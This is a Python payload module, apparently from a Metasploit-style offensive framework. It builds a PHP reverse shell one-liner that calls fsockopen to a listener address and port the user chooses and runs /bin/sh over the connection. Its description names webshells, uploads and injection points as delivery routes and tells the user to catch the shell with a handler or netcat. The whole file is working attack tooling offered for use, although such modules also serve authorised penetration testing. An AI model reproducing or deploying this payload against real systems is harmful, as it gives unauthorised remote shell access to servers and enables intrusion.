"""PHP reverse shell one-liner (fsockopen)."""

from core.module import PayloadModule
from core.options import OptAddress, OptPort

TEMPLATE = (
    "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
    "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
)


class PhpReverseTcp(PayloadModule):
    name = "PHP Reverse Shell (fsockopen)"
    description = """
        For web targets where you can execute PHP: opens a socket back
        with fsockopen and execs /bin/sh over it. The usual delivery is a
        webshell, upload, or injection point on a LAMP/PHP box. Catch it
        with exploits/multi/handler or nc -lvnp <LPORT>.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptAddress("LHOST", required=True,
                                    description="Your listener IP"))
        self.options.add(OptPort("LPORT", default=4444, description="Your listener port"))

    def generate(self):
        return TEMPLATE.format(
            lhost=self.get_option("LHOST"),
            lport=self.get_option("LPORT"),
        )
